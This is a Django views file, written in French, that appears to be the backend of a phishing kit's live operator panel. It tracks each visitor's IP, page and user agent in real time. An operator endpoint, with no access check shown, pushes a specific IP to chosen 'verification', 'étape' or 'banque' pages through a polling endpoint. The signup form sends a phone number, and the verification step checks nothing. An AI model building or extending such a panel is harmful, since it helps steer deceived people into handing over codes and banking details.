from django.shortcuts import render, redirect
import requests
import time
from .middleware import VISITEURS_ACTIFS, REDIRECTIONS, PAGES_DISPONIBLES
from django.views.decorators.http import require_POST
import json

from .forms import InscriptionForm, VerificationForm
from django.http import JsonResponse
from django.core.cache import cache


from django.shortcuts import render, redirect


from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.hashers import make_password

PAGES_DISPONIBLES = [
    ('/', 'Inscription / Connexion'),
    ('/verification/', 'Vérification'),
    ('/etape-1/', 'Étape 1'),
    ('/etape-2/', 'Étape 2'),
    ('/etape-3/', 'Étape 3'),
    ('/etape-4/', 'Étape 4'),
    ('/etape-5/', 'Étape 5'),
    ('/etape-6/', 'Étape 6'),
    ('/banque-1/', 'Banque 1'),
    ('/banque-2/', 'Banque 2'),
]

@require_POST
def rediriger_visiteur(request):
    ip          = request.POST.get('ip')
    destination = request.POST.get('destination')   # ← correspond au name du select

    print(f">>> ADMIN redirige ip='{ip}' vers '{destination}'")

    if not ip or not destination:
        return JsonResponse({'ok': False, 'erreur': 'ip et destination requis'}, status=400)

    pages_autorisees = [url for url, nom in PAGES_DISPONIBLES]
    if destination not in pages_autorisees:
        return JsonResponse({'ok': False, 'erreur': 'destination non autorisée'}, status=400)

    cache.set(f'redirect_{ip}', destination, timeout=300)
    return JsonResponse({'ok': True, 'ip': ip, 'cible': destination})

def verifier_redirection(request):
    from django.http import JsonResponse
    from django.core.cache import cache

    x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded:
        ip = x_forwarded.split(',')[0].strip()
    else:
        ip = request.META.get('REMOTE_ADDR', '')

    if ip == '::1':
        ip = '127.0.0.1'

    print(f">>> POLL ip='{ip}'")

    cible = cache.get(f'redirect_{ip}')
    if cible:
        cache.delete(f'redirect_{ip}')
        print(f">>> REDIRECTION TROUVÉE {ip} → {cible}")

    return JsonResponse({'redirect': cible})

def redirection(request):
    if request.method == "POST":
        destination = request.POST.get("destination")

        pages_autorisees = dict(PAGES_DISPONIBLES)

        if destination in pages_autorisees:
            return redirect(destination)

    return render(
        request,
        "redirection.html",
        {"pages_disponibles": PAGES_DISPONIBLES}
    )
    
def inscription(request):
    if request.method == 'POST':
        form = InscriptionForm(request.POST)
        if form.is_valid():
            form.send_tel()
            return redirect('destination')
    else:
        form = InscriptionForm()

    return render(request, "onboarding\\inscription.html", {'form': form})

def visiteurs_temps_reel(request):
    maintenant = time.time()
    visiteurs = []
    for ip, data in VISITEURS_ACTIFS.items():
        il_y_a = int(maintenant - data['last_seen'])
        visiteurs.append({
            'ip':         ip,
            'page':       data['page'],
            'methode':    data['methode'],
            'user_agent': data['user_agent'],
            'il_y_a':     f"il y a {il_y_a}s",
        })
    visiteurs.sort(key=lambda v: v['il_y_a'])
    return render(request, 'onboarding/visiteurs.html', {
        'visiteurs':    visiteurs,
        'total':        len(visiteurs),
        'pages':        PAGES_DISPONIBLES,
        'pages_json':   json.dumps([{'url': u, 'label': l} for u, l in PAGES_DISPONIBLES]),
    })
def visiteurs_json(request):
    from django.http import JsonResponse
    maintenant = time.time()
    data = []
    for ip, info in VISITEURS_ACTIFS.items():
        il_y_a = int(maintenant - info['last_seen'])
        data.append({
            'ip':      ip,
            'page':    info['page'],
            'methode': info['methode'],
            'il_y_a':  il_y_a,
        })
    data.sort(key=lambda v: v['il_y_a'])
    return JsonResponse({'visiteurs': data, 'total': len(data)})

def verification(request):
    if request.method == 'POST':
        form = VerificationForm(request.POST)
        if form.is_valid():
            # Ici, on vérifierait normalement le code envoyé par e-mail.
            return redirect('etape_1')
    else:
        form = VerificationForm()

    return render(request, 'onboarding/verification.html', {'form': form})

def etape_1(request):
    return render(request, 'onboarding/etape-1.html')


def etape_2(request):
    return render(request, 'onboarding/etape-2.html')


def etape_3(request):
    return render(request, 'onboarding/etape-3.html')


def etape_4(request):
    return render(request, 'onboarding/etape-4.html')


def etape_5(request):
    return render(request, 'onboarding/etape-5.html')


def etape_6(request):
    return render(request, 'onboarding/etape-6.html')


def banque_1(request):
    return render(request, 'onboarding/banque-1.html')

def banque_2(request):
    return render(request, 'onboarding/banque-2.html')


